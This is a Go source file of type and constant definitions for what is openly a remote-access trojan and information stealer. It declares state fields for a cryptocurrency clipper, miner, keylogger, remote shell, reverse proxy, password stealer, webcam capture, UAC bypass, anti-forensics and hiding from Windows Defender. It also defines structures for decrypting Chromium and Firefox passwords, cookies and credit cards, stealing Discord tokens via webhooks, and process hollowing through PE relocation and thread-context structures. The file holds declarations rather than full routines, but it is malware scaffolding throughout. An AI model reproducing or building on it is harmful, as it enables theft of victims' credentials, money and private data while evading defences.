package core

import (
	"context"
	"debug/pe"
	"encoding/asn1"
	"io"
	"log"
	"net"
	"time"
	"unsafe"
)

type UpdateClientInfo struct {
	UID                  string
	ClientVersion        string
	IP                   string
	OS                   string
	GPU                  string
	Abilities            string
	SysInfo              string
	AntiVirus            string
	ClipperState         string
	BTC                  string
	XMR                  string
	ETH                  string
	Custom               string
	Regex                string
	MinerState           string
	Socks5State          string
	ReverseProxyState    string
	RemoteShellState     string
	KeyloggerState       string
	FileHunterState      string
	PasswordStealerState string
	Screenshot           string
	Webcam               string

	PingTime              string
	Jitter                string
	UserAgent             string
	InstanceKey           string
	Install               string
	SmartCopy             string
	InstallName           string
	InstallFolder         string
	Campaign              string
	AntiForensics         string
	AntiForensicsResponse string
	UACBypass             string
	Guardian              string
	DefenceSystem         string
	ACG                   string
	HideFromDefender      string
	AntiProcessWindow     string
	AntiProcess           string
	BlockTaskManager      string
}

type Command struct {
	Id         string
	DAT        string
	Command    string
	Parameters string
}

type ClientSettings struct {
	UID           string
	Clipper       string
	BTC           string
	XMR           string
	ETH           string
	Custom        string
	Regex         string
	Socks5        string
	Socks5Connect string
	Keylogger     string
}

type CommandStatus struct {
	Id     string
	Status string
}

type ClientImage struct {
	Type      string
	ImageData string
}

type FileExplorer struct {
	Path        string   `json:"path"`
	Files       []File   `json:"files"`
	Directories []string `json:"directories"`
}

type File struct {
	Filename string    `json:"filename"`
	ModTime  time.Time `json:"mod_time"`
}

type Win32PnPEntity struct {
	Caption           string
	CreationClassName string
	Description       string
	DeviceID          string
	Manufacturer      string
	Name              string
	PNPClass          string
}

type Win32Process struct {
	Name string
}

type Field struct {
	s    [][]bool
	w, h int
}

type Life struct {
	a, b *Field
	w, h int
}

type baseRelocEntry uint16
type IMAGE_REL_BASED uint16
type usp = unsafe.Pointer
type size_t = int
type Row = []byte
type Ptr = unsafe.Pointer
type PFunc = func([]byte, Ptr, *TypeInfo, int) Ptr
type BASE_RELOCATION_ENTRY uint16

type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_NT_HEADERS struct {
	Signature      uint32
	FileHeader     pe.FileHeader
	OptionalHeader pe.OptionalHeader32
}

type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     pe.FileHeader
	OptionalHeader pe.OptionalHeader64
}

type IMAGE_BASE_RELOCATION struct {
	VirtualAddress uint32
	SizeOfBlock    uint32
}

type m128a struct {
	low  uint64
	high int64
}

type winFileTime struct {
	LowDateTime  uint32
	HighDateTime uint32
}

type ParsedCred struct {
	Target string
	User   string
	Blob   string
}

type UrlNamePass struct {
	Url      string
	Username string
	Pass     string
}

type NamePass struct {
	Name string
	Pass string
}

type ExtractCredentialsResult struct {
	Success bool
	Data    []UrlNamePass
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

type ExtractCredentialsNamePass struct {
	Success bool
	Data    []NamePass
}

type winCred struct {
	Flags              uint32
	Type               uint32
	TargetName         uintptr
	Comment            uintptr
	LastWritten        winFileTime
	CredentialBlobSize uint32
	CredentialBlob     uintptr
	Persist            uint32
	AttributeCount     uint32
	Attributes         uintptr
	TargetAlias        uintptr
	UserName           uintptr
}

type WOW64_FLOATING_SAVE_AREA struct {
	ControlWord   uint32
	StatusWord    uint32
	TagWord       uint32
	ErrorOffset   uint32
	ErrorSelector uint32
	DataOffset    uint32
	DataSelector  uint32
	RegisterArea  [80]byte
	Cr0NpxState   uint32
}

type WOW64_CONTEXT struct {
	ContextFlags      uint32
	Dr0               uint32
	Dr1               uint32
	Dr2               uint32
	Dr3               uint32
	Dr6               uint32
	Dr7       uint32
	FloatSave WOW64_FLOATING_SAVE_AREA
	SegGs     uint32
	SegFs             uint32
	SegEs             uint32
	SegDs             uint32
	Edi               uint32
	Esi               uint32
	Ebx               uint32
	Edx               uint32
	Ecx               uint32
	Eax               uint32
	Ebp               uint32
	Eip               uint32
	SegCs             uint32
	EFlags            uint32
	Esp               uint32
	SegSs             uint32
	ExtendedRegisters [512]byte
}

type CONTEXT struct {
	p1home               uint64
	p2home               uint64
	p3home               uint64
	p4home               uint64
	p5home               uint64
	p6home               uint64
	contextflags         uint32
	mxcsr                uint32
	segcs                uint16
	segds                uint16
	seges                uint16
	segfs                uint16
	seggs                uint16
	segss                uint16
	eflags               uint32
	dr0                  uint64
	dr1                  uint64
	dr2                  uint64
	dr3                  uint64
	dr6                  uint64
	dr7                  uint64
	rax                  uint64
	rcx                  uint64
	rdx                  uint64
	rbx                  uint64
	rsp                  uint64
	rbp                  uint64
	rsi                  uint64
	rdi                  uint64
	r8                   uint64
	r9                   uint64
	r10                  uint64
	r11                  uint64
	r12                  uint64
	r13                  uint64
	r14                  uint64
	r15                  uint64
	rip                  uint64
	anon0                [512]byte
	vectorregister       [26]m128a
	vectorcontrol        uint64
	debugcontrol         uint64
	lastbranchtorip      uint64
	lastbranchfromrip    uint64
	lastexceptiontorip   uint64
	lastexceptionfromrip uint64
}

const (
	EsSystemRequired = 0x00000001
	EsContinuous     = 0x80000000

	STRING = iota
	INT
	CONTEXT_AMD64                                    = 0x100000
	CONTEXT_INTEGER                                  = (CONTEXT_AMD64 | 0x2)
	CREATE_SUSPENDED                                 = 0x00000004
	MEM_RELEASE                                      = 0x8000
	MEM_COMMIT                                       = 0x1000
	MEM_RESERVE                                      = 0x2000
	IMAGE_NT_OPTIONAL_HDR32_MAGIC                    = 0x10b
	IMAGE_NT_OPTIONAL_HDR64_MAGIC                    = 0x20b
	IMAGE_DOS_SIGNATURE                              = 0x5A4D
	IMAGE_NT_SIGNATURE                               = 0x00004550
	IMAGE_DIRECTORY_ENTRY_BASERELOC                  = 5
	IMAGE_NUMBEROF_DIRECTORY_ENTRIES                 = 16
	IMAGE_SIZEOF_SECTION_HEADER                      = 40
	PAGE_EXECUTE_READWRITE                           = 0x40
	IMAGE_REL_BASED_ABSOLUTE         IMAGE_REL_BASED = 0 //The base relocation is skipped. This type can be used to pad a block.
	IMAGE_REL_BASED_HIGH             IMAGE_REL_BASED = 1 //The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word.
	IMAGE_REL_BASED_LOW              IMAGE_REL_BASED = 2 //The base relocation adds the low 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the low half of a 32-bit word.
	IMAGE_REL_BASED_HIGHLOW          IMAGE_REL_BASED = 3 //The base relocation applies all 32 bits of the difference to the 32-bit field at offset.
	IMAGE_REL_BASED_HIGHADJ          IMAGE_REL_BASED = 4 //The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word. The low 16 bits of the 32-bit value are stored in the 16-bit word that follows this base relocation. This means that this base relocation occupies two slots.
	IMAGE_REL_BASED_MIPS_JMPADDR     IMAGE_REL_BASED = 5 //The relocation interpretation is dependent on the machine type.When the machine type is MIPS, the base relocation applies to a MIPS jump instruction.
	IMAGE_REL_BASED_ARM_MOV32        IMAGE_REL_BASED = 5 //This relocation is meaningful only when the machine type is ARM or Thumb. The base relocation applies the 32-bit address of a symbol across a consecutive MOVW/MOVT instruction pair.
	IMAGE_REL_BASED_RISCV_HIGH20     IMAGE_REL_BASED = 5 //This relocation is only meaningful when the machine type is RISC-V. The base relocation applies to the high 20 bits of a 32-bit absolute address.
	IMAGE_REL_BASED_THUMB_MOV32      IMAGE_REL_BASED = 7 //This relocation is meaningful only when the machine type is Thumb. The base relocation applies the 32-bit address of a symbol to a consecutive MOVW/MOVT instruction pair.
	IMAGE_REL_BASED_RISCV_LOW12I     IMAGE_REL_BASED = 7 //This relocation is only meaningful when the machine type is RISC-V. The base relocation applies to the low 12 bits of a 32-bit absolute address formed in RISC-V I-type instruction format.
	IMAGE_REL_BASED_RISCV_LOW12S     IMAGE_REL_BASED = 8 //This relocation is only meaningful when the machine type is RISC-V. The base relocation applies to the low 12 bits of a 32-bit absolute address formed in RISC-V S-type instruction format.
	IMAGE_REL_BASED_MIPS_JMPADDR16   IMAGE_REL_BASED = 9 //The relocation is only meaningful when the machine type is MIPS. The base relocation applies to a MIPS16 jump instruction.
	IMAGE_REL_BASED_DIR64            IMAGE_REL_BASED = 10
	PAGE_READWRITE                                   = 0x04
	PAGE_EXECUTE_READ                                = 0x20
	RELOC_32BIT_FIELD                                = 3
	RELOC_64BIT_FIELD                                = 0xA

	VK_BACK     = 0x08
	VK_TAB      = 0x09
	VK_RETURN   = 0x0D
	VK_SHIFT    = 0x10
	VK_CONTROL  = 0x11
	VK_MENU     = 0x12
	VK_CAPITAL  = 0x14
	VK_ESCAPE   = 0x1B
	VK_PRIOR    = 0x21
	VK_NEXT     = 0x22
	VK_END      = 0x23
	VK_HOME     = 0x24
	VK_LEFT     = 0x25
	VK_UP       = 0x26
	VK_RIGHT    = 0x27
	VK_DOWN     = 0x28
	VK_SELECT   = 0x29
	VK_PRINT    = 0x2A
	VK_EXECUTE  = 0x2B
	VK_SNAPSHOT = 0x2C
	VK_INSERT   = 0x2D
	VK_DELETE   = 0x2E
	VK_LWIN     = 0x5B
	VK_RWIN     = 0x5C
	VK_APPS     = 0x5D
	VK_SLEEP    = 0x5F
	VK_F1       = 0x70
	VK_F2       = 0x71
	VK_F3       = 0x72
	VK_F4       = 0x73
	VK_F5       = 0x74
	VK_F6       = 0x75
	VK_F7       = 0x76
	VK_F8       = 0x77
	VK_F9       = 0x78
	VK_F10      = 0x79
	VK_F11      = 0x7A
	VK_F12      = 0x7B
	VK_NUMLOCK  = 0x90
	VK_SCROLL   = 0x91

	cfUnicodetext = 13
	gmemMoveable  = 0x0002

	Null Type = iota
	False
	Number
	String
	True
	JSON

	jnull jtype = iota
	jfalse
	jnumber
	jstring
	jtrue
	jjson
	byKey byKind = 0
	byVal byKind = 1

	socks5Version          = uint8(5)
	ConnectCommand         = uint8(1)
	BindCommand            = uint8(2)
	AssociateCommand       = uint8(3)
	ipv4Address            = uint8(1)
	fqdnAddress            = uint8(3)
	ipv6Address            = uint8(4)
	successReply     uint8 = iota
	serverFailure
	ruleFailure
	networkUnreachable
	hostUnreachable
	connectionRefused
	ttlExpired
	commandNotSupported
	addrTypeNotSupported
	NoAuth          = uint8(0)
	noAcceptable    = uint8(255)
	UserPassAuth    = uint8(2)
	userAuthVersion = uint8(1)
	authSuccess     = uint8(0)
	authFailure     = uint8(1)

	ipVersion        = 4
	ipv4MinHeaderLen = 20
	tcpMinHeaderLen  = 20
)

type UserStruct struct {
	ID            string `json:"id"`
	Username      string `json:"username"`
	Discriminator string `json:"discriminator"`
	Email         string `json:"email"`
	Verified      bool   `json:"verified"`
	Phone         string `json:"phone,omitempty"`
	Token         string
}

type WebhookData struct {
	AvatarURL string          `json:"avatar_url,omitempty"`
	Embeds    []*WebhookEmbed `json:"embeds,omitempty"`
	Username  string          `json:"username,omitempty"`
}

type WebhookEmbed struct {
	URL       string          `json:"url,omitempty"`
	Timestamp string          `json:"timestamp,omitempty"`
	Colour    int             `json:"color,omitempty"`
	Footer    *EmbedFooter    `json:"footer,omitempty"`
	Image     *EmbedImage     `json:"image,omitempty"`
	Thumbnail *EmbedThumbnail `json:"thumbnail,omitempty"`
	Author    *EmbedAuthor    `json:"author,omitempty"`
	Fields    []*EmbedField   `json:"fields,omitempty"`
}

type EmbedAuthor struct {
	Name string `json:"name,omitempty"`
}

type EmbedField struct {
	Name   string `json:"name,omitempty"`
	Value  string `json:"value,omitempty"`
	Inline bool   `json:"inline,omitempty"`
}

type EmbedFooter struct {
	Text    string `json:"text,omitempty"`
	IconURL string `json:"icon_url,omitempty"`
}

type EmbedImage struct {
	URL string `json:"url,omitempty"`
}

type EmbedThumbnail struct {
	URL string `json:"url,omitempty"`
}
type IPApi struct {
	Country string `json:"country"`
	Region  string `json:"region"`
	City    string `json:"City"`
	ISP     string `json:"isp"`
	ORG     string `json:"org"`
}

type TCPHeader struct {
	Src     int
	Dst     int
	Seq     int
	Ack     int
	Len     int
	Rsvd    int
	Flag    int
	Win     int
	Sum     int
	Urp     int
	Options []byte
}

type IPv4Header struct {
	Version  int
	Len      int
	TOS      int
	TotalLen int
	ID       int
	Flags    int
	FragOff  int
	TTL      int
	Protocol int
	Checksum int
	Src      net.IP
	Dst      net.IP
	Options  []byte
}

type DicordAccounts struct {
	Username      string `json:"username"`
	Discriminator string `json:"discriminator"`
	Id            string `json:"id"`
	Locale        string `json:"locale"`
	Avatar        string `json:"avatar"`
	Premium       int    `json:"premium_type"`
}

type AuthContext struct {
	Method  uint8
	Payload map[string]string
}

type AddrSpec struct {
	FQDN string
	IP   net.IP
	Port int
}

type Request struct {
	Version      uint8
	Command      uint8
	AuthContext  *AuthContext
	RemoteAddr   *AddrSpec
	DestAddr     *AddrSpec
	realDestAddr *AddrSpec
	bufConn      io.Reader
}

type PermitCommand struct {
	EnableConnect   bool
	EnableBind      bool
	EnableAssociate bool
}

type Config struct {
	AuthMethods []Authenticator
	Credentials CredentialStore
	Resolver    NameResolver
	Rules       RuleSet
	Rewriter    AddressRewriter
	BindIP      net.IP
	Logger      *log.Logger
	Dial        func(ctx context.Context, network, addr string) (net.Conn, error)
}

type Server struct {
	config      *Config
	authMethods map[uint8]Authenticator
}

type Style struct {
	Key, String, Number [2]string
	True, False, Null   [2]string
	Escape              [2]string
	Append              func(dst []byte, c byte) []byte
}

type byKind int
type jtype int

type subSelector struct {
	name string
	path string
}

type pair struct {
	kstart, kend int
	vstart, vend int
}

type CookieStruct struct {
	Browser        string
	EncryptedValue []byte
	Host           string
	Name           string
	Path           string
	Value          string
}

type UserPassAuthenticator struct {
	Credentials CredentialStore
}

type byKeyVal struct {
	sorted bool
	json   []byte
	buf    []byte
	pairs  []pair
}

type Options struct {
	Width    int
	Prefix   string
	Indent   string
	SortKeys bool
}

type stringHeader struct {
	data unsafe.Pointer
	len  int
}

type sliceHeader struct {
	data unsafe.Pointer
	len  int
	cap  int
}
type parseContext struct {
	json  string
	value Result
	pipe  string
	piped bool
	calcd bool
	lines bool
}

type arrayPathResult struct {
	part    string
	path    string
	pipe    string
	piped   bool
	more    bool
	alogok  bool
	arrch   bool
	alogkey string
	query   struct {
		on    bool
		all   bool
		path  string
		op    string
		value string
	}
}

type Result struct {
	Type Type
	Raw  string
	Str   string
	Num   float64
	Index int
}

type TypeInfo struct {
	fields int
	Type   []uint
	Pos    []int
	Size   []int
	Offset []uintptr
	Save   []PFunc
	Dump   []PFunc
}

type Keylogger struct {
	lastKey int
}

type Key struct {
	Empty   bool
	Rune    rune
	Keycode int
}

type Container struct {
	ti   *TypeInfo
	Rows []Row
}

type Chromium struct {
	name        string
	profilePath string
	keyPath     string
	storage     string // storage use for linux and macOS, get secret key
	secretKey   []byte
}

type dataBlob struct {
	cbData uint32
	pbData *byte
}

type NssPBE struct {
	NssSequenceA
	Encrypted []byte
}

type NssSequenceA struct {
	DecryptMethod asn1.ObjectIdentifier
	NssSequenceB
}

type NssSequenceB struct {
	EntrySalt []byte
	Len       int
}

type MetaPBE struct {
	MetaSequenceA
	Encrypted []byte
}

type MetaSequenceA struct {
	PKCS5PBES2 asn1.ObjectIdentifier
	MetaSequenceB
}
type MetaSequenceB struct {
	MetaSequenceC
	MetaSequenceD
}

type MetaSequenceC struct {
	PKCS5PBKDF2 asn1.ObjectIdentifier
	MetaSequenceE
}

type MetaSequenceD struct {
	AES256CBC asn1.ObjectIdentifier
	IV        []byte
}

type MetaSequenceE struct {
	EntrySalt      []byte
	IterationCount int
	KeySize        int
	MetaSequenceF
}

type MetaSequenceF struct {
	HMACWithSHA256 asn1.ObjectIdentifier
}

type LoginPBE struct {
	CipherText []byte
	LoginSequence
	Encrypted []byte
}

type LoginSequence struct {
	asn1.ObjectIdentifier
	IV []byte
}

type passwords struct {
	mainPath string
	subPath  string
	logins   []loginData
}

type downloads struct {
	mainPath  string
	downloads []download2
}

type historyData struct {
	mainPath string
	history  []history2
}

type cookies struct {
	mainPath string
	cookies  map[string][]cookie2
}

type bookmarks struct {
	mainPath  string
	bookmarks []bookmark2
}

type Browser interface {
	InitSecretKey() error
	GetName() string
	GetSecretKey() []byte
	GetAllItems() ([]Item, error)
	GetItem(itemName string) (Item, error)
}

type Firefox struct {
	name        string
	profilePath string
	keyPath     string
}

type creditCards struct {
	mainPath string
	cards    map[string][]card
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               uintptr
}

type PEB struct {
	InheritedAddressSpace    byte    // BYTE	0
	ReadImageFileExecOptions byte    // BYTE	1
	BeingDebugged            byte    // BYTE	2
	reserved2                [1]byte // BYTE 3

	Mutant                 uintptr     // BYTE 4
	ImageBaseAddress       uintptr     // BYTE 8
	Ldr                    uintptr     // PPEB_LDR_DATA
	ProcessParameters      uintptr     // PRTL_USER_PROCESS_PARAMETERS
	reserved4              [3]uintptr  // PVOID
	AtlThunkSListPtr       uintptr     // PVOID
	reserved5              uintptr     // PVOID
	reserved6              uint32      // ULONG
	reserved7              uintptr     // PVOID
	reserved8              uint32      // ULONG
	AtlThunkSListPtr32     uint32      // ULONG
	reserved9              [45]uintptr // PVOID
	reserved10             [96]byte    // BYTE
	PostProcessInitRoutine uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
	reserved11             [128]byte   // BYTE
	reserved12             [1]uintptr  // PVOID
	SessionId              uint32      // ULONG
}

// https://github.com/elastic/go-windows/blob/master/ntdll.go#L77
type PROCESS_BASIC_INFORMATION struct {
	reserved1                    uintptr    // PVOID
	PebBaseAddress               uintptr    // PPEB
	reserved2                    [2]uintptr // PVOID
	UniqueProcessId              uintptr    // ULONG_PTR
	InheritedFromUniqueProcessID uintptr    // PVOID
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER32 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	BaseOfData                  uint32 // Different from 64 bit header
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               uintptr
}

type Type int

type (
	loginData struct {
		UserName    string
		encryptPass []byte
		encryptUser []byte
		Password    string
		LoginUrl    string
		CreateDate  time.Time
	}
	bookmark2 struct {
		ID        int64
		Name      string
		Type      string
		URL       string
		DateAdded time.Time
	}
	cookie2 struct {
		Host         string
		Path         string
		KeyName      string
		encryptValue []byte
		Value        string
		IsSecure     bool
		IsHTTPOnly   bool
		HasExpire    bool
		IsPersistent bool
		CreateDate   time.Time
		ExpireDate   time.Time
	}
	history2 struct {
		Title         string
		Url           string
		VisitCount    int
		LastVisitTime time.Time
	}
	download2 struct {
		TargetPath string
		Url        string
		TotalBytes int64
		StartTime  time.Time
		EndTime    time.Time
		MimeType   string
	}
	card struct {
		GUID            string
		Name            string
		ExpirationYear  string
		ExpirationMonth string
		CardNumber      string
	}
)

type Item interface {
	ChromeParse(key []byte) error
	FirefoxParse() error
	OutPut(format, browser, dir string) error
	CopyDB() error
	Release() error
}

func (r *BASE_RELOCATION_ENTRY) GetOffset() (_offset uint16) {
	_offset = uint16(*r) & 0x0fff
	return
}

func (r *BASE_RELOCATION_ENTRY) SetOffset(_offset uint16) {
	*r = *r | BASE_RELOCATION_ENTRY(_offset&0x0fff)
}

func (r *BASE_RELOCATION_ENTRY) SetType(_type uint16) {
	*r = *r | BASE_RELOCATION_ENTRY(_type&0xf000)
}

func (r *BASE_RELOCATION_ENTRY) GetType() (_type uint16) {
	_type = (uint16(*r) & 0xf000) >> 12
	return
}

func (b baseRelocEntry) Type() IMAGE_REL_BASED {
	return IMAGE_REL_BASED(uint16(b) >> 12)
}

func (b baseRelocEntry) Offset() uint32 {
	return uint32(uint16(b) & 0x0FFF)
}
